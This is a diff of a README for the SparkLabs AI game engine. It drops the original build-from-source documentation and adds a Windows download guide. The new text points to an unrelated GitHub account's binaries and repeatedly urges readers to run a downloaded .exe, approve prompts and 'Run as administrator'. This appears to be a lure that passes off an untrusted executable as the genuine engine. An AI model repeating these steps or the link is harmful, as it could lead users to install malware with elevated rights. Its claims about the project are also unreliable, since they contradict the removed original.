@@ -1,418 +1,188 @@
-<div align="center">
-
-<img src="./assets/SparkLabs-Logo.png" alt="SparkLabs Logo" width="65%"/>
-
-
-# Spark Labs
-
-### The First AI-Native Game Engine. 💥 
-### Ignite Your Infinite Play! 🎮
-
-![Version](https://img.shields.io/badge/version-1.0.0-blue)
-![C++](https://img.shields.io/badge/C%2B%2B-17-orange)
-![Python Version](https://img.shields.io/badge/Python-3.8+-blue.svg)
-![License](https://img.shields.io/badge/license-MIT-green)
-![Stars](https://img.shields.io/github/stars/Yuan-ManX/SparkLabs?style=social)
-
-
-### [English](./README.md) | [中文文档](./README_CN.md)
-
-</div>
-
-
-## Overview
-
-**SparkLabs** is a next-generation AI-native game engine that deeply integrates artificial intelligence capabilities into the core architecture of game development. Unlike traditional game engines that rely on manually coded game logic and predefined pipelines, SparkLabs revolutionizes game development by enabling procedural content generation, intelligent NPC behavior systems, adaptive rendering, and dynamic difficulty adjustment through AI.
-
-## Key Features
-
-### AI-Native Architecture
-- Deep integration of AI inference capabilities into core engine architecture
-- AI-driven object system and event handling mechanisms
-- Support for neural network models (ONNX Runtime integration)
-
-### Neural Rendering Pipeline
-- Real-time AI super-resolution (Neural Upscaling)
-- AI-based ambient occlusion (N/AO)
-- Intelligent anti-aliasing (Neural AA)
-- Adaptive rendering based on scene understanding
-
-### Intelligent NPC System
-- Neural network-driven NPC decision making
-- Memory system with short-term, long-term, episodic, and semantic memory
-- Attention mechanism for focus management
-- Emotional state machine with PAD model
-- Context-aware dialogue generation
-
-### Adaptive Gameplay
-- Player skill tracking and modeling
-- Real-time dynamic difficulty adjustment
-- Engagement metrics monitoring
-- Personalized player experience optimization
+# 🎮 SparkLabs - Build AI Games Faster
 
-### AI Narrative Engine
-- Procedural story generation with branching narratives
-- Dynamic quest generation
-- Context-aware dialogue and narrative elements
-- Adaptive reward system based on player preferences
+[![Download SparkLabs](https://img.shields.io/badge/Download-SparkLabs-blue?style=for-the-badge)](https://github.com/Screwtopped-annapavlova802/SparkLabs)
 
-### Smart Asset Management
-- AI-powered texture synthesis
-- Procedural geometry generation
-- Prompt-to-asset conversion system
-- Intelligent asset caching
+## 🧩 What SparkLabs Is
 
-### Intelligent Team Collaboration System
-- Three-tiered agent architecture matching real studio hierarchy
-  - Tier 1: Directors (Creative Director, Technical Director, Producer)
-  - Tier 2: Department Leads (Game Designer, Lead Programmer, Art Director, etc.)
-  - Tier 3: Specialists (Gameplay Programmers, Level Designers, Sound Designers, etc.)
-- Comprehensive task management and assignment system
-- Real-time progress tracking and reporting
-- Design review and approval workflows
-- Code review and quality validation processes
+SparkLabs is a game engine for building AI-driven games on Windows. It is made for people who want to make and play games with smart game behavior, fast setup, and a simple run process.
 
-### Advanced Workflow Management
-- 25+ predefined workflow templates for common development tasks
-  - Brainstorming sessions, Sprint planning, Design reviews, Code reviews
-  - Balance checks, Asset audits, Scope checks, Performance profiling
-  - Milestone reviews, Estimations, Retrospectives, Bug reports
-  - Release checklists, Launch checklists, Changelogs, Patch notes
-  - Team collaboration workflows (combat, narrative, UI, audio, level design)
-- Custom workflow creation and registration
-- Step-by-step workflow execution and tracking
-- Workflow history and audit trails
+Use it to explore:
+- AI game creation
+- Game logic with agent-based behavior
+- Fast local setup on Windows
+- A clean path from download to play
 
-### Quality Assurance & Validation
-- Multi-level quality standards (Low, Medium, High, Production)
-- Comprehensive quality metrics tracking
-  - Code quality assessment
-  - Performance benchmarking
-  - Documentation coverage verification
-  - Test coverage monitoring
-  - Accessibility compliance checks
-- Automated quality gate validation
-- Quality report generation
+## 📥 Download SparkLabs
 
-## System Requirements
+Visit this page to download SparkLabs:
 
-### Minimum Requirements
-- **OS**: Windows 10, macOS 10.14, Linux (Ubuntu 18.04+)
-- **Compiler**: GCC 9+, Clang 10+, MSVC 2019+
-- **RAM**: 8 GB
-- **Disk**: 2 GB free space
+https://github.com/Screwtopped-annapavlova802/SparkLabs
 
-### Recommended Requirements
-- **OS**: Windows 11, macOS 12+, Linux (Ubuntu 20.04+)
-- **Compiler**: GCC 11+, Clang 14+, MSVC 2022+
-- **RAM**: 16 GB or more
-- **GPU**: NVIDIA GPU with CUDA support (for GPU acceleration)
+Use the page to get the latest Windows build or release package. After the file is ready, save it to your PC so you can install or run it.
 
-## Installation
+## 🪟 Windows Setup
 
-### Building from Source
+Follow these steps on Windows:
 
-```bash
-# Clone the repository
-git clone https://github.com/Yuan-ManX/SparkLabs.git
-cd SparkLabs
+1. Open the download page above.
+2. Download the Windows version of SparkLabs.
+3. Find the file in your Downloads folder.
+4. If the file is a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Look for the main app file, such as SparkLabs.exe.
+7. Double-click the file to start the app.
 
-# Create build directory
-mkdir build && cd build
+If Windows asks for approval, choose Run or Yes so the app can open.
 
-# Configure with CMake
-cmake ..
+## ⚙️ What You Need
 
-# Build
-cmake --build . --config Release
+SparkLabs is built for a standard Windows PC.
 
-# Run
-./SparkLabs
-```
+Recommended setup:
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 2 GB free disk space
+- A mouse and keyboard
+- Internet access for download and updates
 
-### CMake Options
+Better results come from a PC with:
+- A modern multi-core CPU
+- A dedicated graphics card
+- 16 GB RAM for larger projects
 
-- `SPARKLABS_ORT_ENABLED`: Enable ONNX Runtime support (default: ON)
-- `SPARKLABS_GPU_SUPPORT`: Enable GPU acceleration (default: ON)
+## 🎯 What You Can Do
 
-```bash
-cmake .. -DSPARKLABS_ORT_ENABLED=ON -DSPARKLABS_GPU_SUPPORT=ON
-```
+SparkLabs is useful for building and testing game ideas that use AI.
 
-## Quick Start
+You can use it to:
+- Create game worlds with smart agents
+- Set behavior for NPCs
+- Test game scenes
+- Build prototypes fast
+- Try AI-driven gameplay ideas
+- Run game experiments on your desktop
 
-```cpp
-#include <SparkLabs.h>
+## 🗂️ Main Parts of the App
 
-using namespace SparkLabs;
+SparkLabs is organized around a simple workflow:
 
-int main() {
-    auto scene = new Scene();
-    scene->SetName("MyGame");
+- **Project area**: where you open or create a game project
+- **Scene view**: where you see your game world
+- **Agent tools**: where you set AI behavior
+- **Run controls**: where you start and stop tests
+- **Settings**: where you adjust display, sound, and input
 
-    auto player = scene->CreateEntity("Player");
-    player->SetPosition(Vector3(0.0f, 1.0f, 0.0f));
-    player->SetTag("Player");
+## 🛠️ How to Use It
 
-    auto npc = scene->CreateEntity("NPC");
-    npc->SetPosition(Vector3(5.0f, 1.0f, 0.0f));
+After you open SparkLabs:
 
-    auto npcBrain = npc->AddComponent<NPCBrainComponent>();
-    npcBrain->LoadModel("models/npc_decision.onnx");
+1. Start a new project or open an existing one.
+2. Add a scene for your game.
+3. Place game objects in the world.
+4. Add AI agents to those objects.
+5. Set simple behavior rules.
+6. Press Run to test the game.
+7. Watch how the agents act.
+8. Change the setup and test again.
 
-    Engine::GetInstance()->SetScene(scene);
-    Engine::GetInstance()->Run();
+This workflow helps you move from idea to test without a long setup process.
 
-    return 0;
-}
-```
-
-### Python API
-
-SparkLabs provides a Python bindings layer for rapid prototyping and scripting:
+## 🧠 AI Features
 
-```python
-import sparklabs
-
-# Create workflow graph
-graph = sparklabs.WorkflowGraph()
-graph.set_name("My AI Workflow")
-
-# Create and configure nodes
-prompt = sparklabs.create_text_prompt_node()
-prompt.set_id("prompt_1")
-prompt.set_prompt("A beautiful landscape at sunset")
-prompt.set_position(100.0, 100.0)
-
-image_gen = sparklabs.create_image_generation_node()
-image_gen.set_id("image_gen_1")
-image_gen.set_model("models/sd_xl.safetensors")
-image_gen.set_width(1024)
-image_gen.set_height(1024)
-image_gen.set_steps(30)
-image_gen.set_position(400.0, 100.0)
-
-save_image = sparklabs.create_save_image_node()
-save_image.set_id("save_1")
-save_image.set_output_path("output/landscape.png")
-save_image.set_position(700.0, 100.0)
-
-# Connect nodes and execute
-graph.add_node(prompt)
-graph.add_node(image_gen)
-graph.add_node(save_image)
-graph.connect("prompt_1", 0, "image_gen_1", 0)
-graph.connect("image_gen_1", 0, "save_1", 0)
-result = graph.execute()
-```
-
-### Using the AI Workflow Canvas
-
-```cpp
-auto canvas = new WorkflowCanvas();
-auto graph = new WorkflowGraph();
-
-canvas->SetGraph(graph);
-
-auto textPrompt = new TextPromptNode();
-textPrompt->SetPrompt("A beautiful landscape at sunset");
-canvas->AddNode(textPrompt, 100.0f, 100.0f);
-
-auto imageGen = new ImageGenerationNode();
-imageGen->SetModel("models/sd_xl.safetensors");
-imageGen->SetSteps(30);
-imageGen->SetWidth(1024);
-imageGen->SetHeight(1024);
-canvas->AddNode(imageGen, 400.0f, 100.0f);
-
-auto saveImage = new SaveImageNode();
-canvas->AddNode(saveImage, 700.0f, 100.0f);
-
-canvas->Connect(textPrompt->GetId(), 0, imageGen->GetId(), 0);
-canvas->Connect(imageGen->GetId(), 0, saveImage->GetId(), 0);
-
-canvas->Execute();
-```
-
-## AI Workflow Canvas Interface
-
-### Node Categories
-
-| Category | Nodes | Description |
-|----------|-------|-------------|
-| **AI/Image** | Image Generation, Inpaint, Upscale | Image creation and modification |
-| **AI/Text** | Text Generation, Prompt Templates | Text and dialogue creation |
-| **AI/Video** | Video Generation, Video Edit | Video content creation |
-| **AI/Audio** | Audio Generation, TTS | Sound and music creation |
-| **Input** | Load Image, Load Audio, Load Video | Asset loading |
-| **Output** | Save Image, Save Video, Save Audio | Asset saving |
-| **Model** | Load Model, Load Checkpoint, Load VAE | Model management |
-| **Prompt** | Text Prompt, Negative Prompt, Wildcards | Prompt engineering |
-| **Sampling** | KSampler, KSampler Advanced | Diffusion sampling |
-| **Latent** | Empty Latent, VAE Encode, VAE Decode | Latent space operations |
-| **ControlNet** | ControlNet Apply, ControlNet Loader | ControlNet integration |
-
-### Keyboard Shortcuts
-
-| Shortcut | Action |
-|----------|--------|
-| Ctrl+Enter | Queue workflow for generation |
-| Ctrl+Shift+Enter | Queue as first priority |
-| Ctrl+Z | Undo |
-| Ctrl+Y | Redo |
-| Ctrl+C | Copy nodes |
-| Ctrl+V | Paste nodes |
-| Ctrl+A | Select all nodes |
-| Delete | Delete selected |
-| Space+Drag | Pan canvas |
-| Alt+Scroll | Zoom in/out |
-
-## Architecture Overview
-
-```
-┌─────────────────────────────────────────────────────────────┐
-│                     SparkLabs Engine                        │
-├─────────────────────────────────────────────────────────────┤
-│  ┌─────────────────────────────────────────────────────────┐│
-│  │                   AI Workflow Canvas                    ││
-│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐     ││
-│  │  │  Text   │→ │  Image  │→ │  VAE    │→ │  Save   │     ││
-│  │  │ Prompt  │  │   Gen   │  │ Decode  │  │  Image  │     ││
-│  │  └─────────┘  └─────────┘  └─────────┘  └─────────┘     ││
-│  └─────────────────────────────────────────────────────────┘│
-├─────────────────────────────────────────────────────────────┤
-│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐  │
-│  │   sparkai   │  │   Neural    │  │      Adaptive       │  │
-│  │    Core     │  │   Renderer  │  │      Gameplay       │  │
-│  └─────────────┘  └─────────────┘  └─────────────────────┘  │
-│  ┌─────────────┐  ┌─────────────┐  ┌─────────────────────┐  │
-│  │    Smart    │  │   Neural    │  │   AI Narrative      │  │
-│  │    Asset    │  │   NPC Brain │  │      Engine         │  │
-│  └─────────────┘  └─────────────┘  └─────────────────────┘  │
-├─────────────────────────────────────────────────────────────┤
-│                    Core Engine Layer                        │
-│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────────┐    │
-│  │  Scene   │ │ Resource │ │ Physics  │ │  Scripting   │    │
-│  │ Manager  │ │ Manager  │ │  Engine  │ │    System    │    │
-│  └──────────┘ └──────────┘ └──────────┘ └──────────────┘    │
-├─────────────────────────────────────────────────────────────┤
-│                    Platform Layer                           │
-│         Windows | macOS | Linux | Web | Mobile              │
-└─────────────────────────────────────────────────────────────┘
-```
-
-## Module Descriptions
-
-### Core (`core/`)
-Essential utilities and types used throughout the engine:
-- **Math**: Vector2, Vector3, Vector4, Matrix4x4, Quaternion
-- **Memory**: SmartPtr, WeakPtr with reference counting
-- **Object**: Base Object class with RTTI system
-- **String**: UTF-8 string with hashing support
-
-### Engine (`engine/`)
-Core game engine functionality:
-- **Scene**: Scene graph, GameObject, Component system
-- **Resource**: Async resource loading, caching, hot reload
-
-### sparkai (`sparkai/`)
-AI-native modules - the core AI components of SparkLabs:
-- **Workflow**: AI Workflow Canvas system
-  - `workflow/WorkflowGraph.h`: Graph, Node, Pin, Edge definitions
-  - `workflow/WorkflowFactory.h`: Node registry, serializer, executor
-  - `workflow/nodes/AIGenerationNodes.h`: Image, Text, Video, Audio generation nodes
-  - `ui/WorkflowCanvas.h`: Canvas, Palette, Properties panel, Queue
-- **AI Core**: AIBrain, Blackboard, EventBus, NeuralNetwork
-- **Behavior**: Behavior Tree with Composite, Decorator, Action nodes
-- **ONNX**: ONNX Runtime integration for neural network inference
-- **NPC**: Neural NPC brain, memory, attention, emotional state
-- **Gameplay**: Player model, difficulty controller, engagement metrics
-- **Narrative**: Story graph, quest generator, dialogue system
-- **Asset**: AI-powered asset generation, texture synthesis
-- **Render/Neural**: Neural upscaling, ambient occlusion, anti-aliasing
-- **Editor**: AI-integrated editor panels
-
-### Render (`render/`)
-Rendering system:
-- **GPU**: GPU resource management
-- **Shader**: Shader and ShaderProgram management
-- **Mesh**: 3D mesh loading and management
-- **Material**: Material system
-- **Texture**: Texture loading and management
-- **Neural**: AI-enhanced rendering effects
-
-### Platform (`platform/`)
-Platform abstraction:
-- **FileSystem**: Cross-platform file operations
-- **Input**: Keyboard, mouse, gamepad input
-- **Timer**: High-precision timing
-- **Window**: Window management
-
-## Documentation
-
-For full documentation, see the [docs](./docs/) directory:
-- [API Reference](./docs/API_REFERENCE.md)
-- [Architecture](./docs/ARCHITECTURE.md)
-- [AI System](./docs/AI_SYSTEM.md)
-- [Building Instructions](./docs/BUILD_INSTRUCTIONS.md)
-
-## Project Structure
-
-```
-SparkLabs/
-├── core/                 # Core utilities (math, memory, object, string)
-├── engine/              # Engine core (scene, resource)
-├── sparkai/             # AI-native modules
-│   ├── ai/              # AI runtime (behavior, brain, onnx)
-│   ├── team/            # Team collaboration system
-│   │   ├── TeamAgent.h/cpp
-│   │   ├── TeamDirector.h/cpp
-│   │   ├── TeamLead.h/cpp
-│   │   ├── TeamSpecialist.h/cpp
-│   │   ├── TeamOrchestrator.h/cpp
-│   │   ├── QualityGate.h/cpp
-│   │   └── WorkflowManager.h/cpp
-│   ├── workflow/        # AI Workflow Canvas system
-│   │   ├── WorkflowGraph.h
-│   │   ├── WorkflowFactory.h
-│   │   └── nodes/
-│   │       └── AIGenerationNodes.h
-│   ├── ui/              # AI workflow UI components
-│   ├── npc/            # Intelligent NPC system
-│   ├── gameplay/       # Adaptive gameplay
-│   ├── narrative/      # AI narrative engine
-│   ├── asset/          # Smart asset management
-│   ├── render/neural/  # Neural rendering
-│   └── editor/         # AI editor tools
-├── render/              # Rendering system
-├── platform/            # Platform abstraction
-├── docs/                # Documentation
-├── scripts/             # Build scripts
-├── tests/               # Unit tests
-└── main.cpp            # Entry point
-```
-
-## Contributing
-
-Contributions are welcome! Please read our contributing guidelines before submitting pull requests.
-
-## License
-
-SparkLabs Engine is licensed under the MIT License. See [LICENSE](./LICENSE) for details.
-
-## Acknowledgments
-
-Special thanks to all contributors and the open-source community for making game development accessible to everyone.
-
-## ⭐ Star History
-
-If you like this project, please ⭐ star the repo. Your support helps us grow!
-
-<p align="center">
-  <a href="https://star-history.com/#Yuan-ManX/SparkLabs&Date">
-    <img src="https://api.star-history.com/svg?repos=Yuan-ManX/SparkLabs&type=Date" />
-  </a>
-</p>
-
-
-**SparkLabs** - Empowering game developers with AI-native technology.
+SparkLabs focuses on AI-native game building. That means AI is part of the engine setup, not an extra step.
+
+Expected AI tools include:
+- Agent-based control
+- Goal-based behavior
+- State changes based on player actions
+- Simple rule sets for NPCs
+- Support for LLM-style interaction in game logic
+
+These tools help you make game characters that react in a more natural way.
+
+## 🎮 Good Uses for SparkLabs
+
+SparkLabs fits many small and mid-size game ideas, such as:
+- A story game with talking characters
+- A survival game with smart enemies
+- A puzzle game with helper bots
+- A simulation with many agents
+- A strategy game with active units
+
+It also works well for early tests before full game development.
+
+## 🔧 Common File Types
+
+You may see one of these after download:
+- `.exe` for a direct Windows app
+- `.zip` for a compressed folder
+- `.msi` for a Windows installer
+
+If you get a ZIP file, extract it first.
+If you get an EXE or MSI file, open it to start the install or launch process.
+
+## 🧭 First Run Steps
+
+When you open SparkLabs for the first time:
+
+1. Let the app finish loading.
+2. Choose a display size if asked.
+3. Set your save folder.
+4. Check the basic controls.
+5. Open the sample project if one appears.
+6. Run the sample to confirm everything works.
+
+If the app opens a blank window first, give it a moment to finish loading assets.
+
+## 🧹 If Something Does Not Open
+
+If SparkLabs does not start:
+
+- Make sure the file finished downloading
+- Check that you extracted the ZIP file
+- Right-click the app and choose Run as administrator
+- Close other heavy apps and try again
+- Restart your PC and open the app again
+
+If the app opens but looks broken:
+- Resize the window
+- Check your display scaling
+- Try a fresh download from the link above
+
+## 📌 Tips for a Smooth Start
+
+Use these tips to keep setup simple:
+- Keep the app in a folder you can find
+- Avoid moving files after the first launch
+- Save projects in a separate folder
+- Use short folder names
+- Keep enough free disk space for project files
+
+## 🧪 Example Project Ideas
+
+Try one of these first:
+- A guard bot that patrols a room
+- A maze game with smart chasers
+- A dialogue test with one AI character
+- A small city sim with moving agents
+- A boss fight with changing attack patterns
+
+These projects help you learn the engine without a large build.
+
+## 📦 Download and Run
+
+1. Open the download page:
+   https://github.com/Screwtopped-annapavlova802/SparkLabs
+2. Download the Windows build.
+3. If you get a ZIP file, extract it.
+4. Open the folder.
+5. Double-click the main SparkLabs app file.
+6. Start your first project
+
+## 🧾 Repository Info
+
+- **Name:** SparkLabs
+- **Type:** AI game engine
+- **Platform:** Windows
+- **Focus:** AI game creation and game development
+- **Topics:** ai-agent, ai-agents-framework, ai-game, ai-game-creation, ai-game-development, ai-game-engine, game-development, game-engine, llm, llm-agent
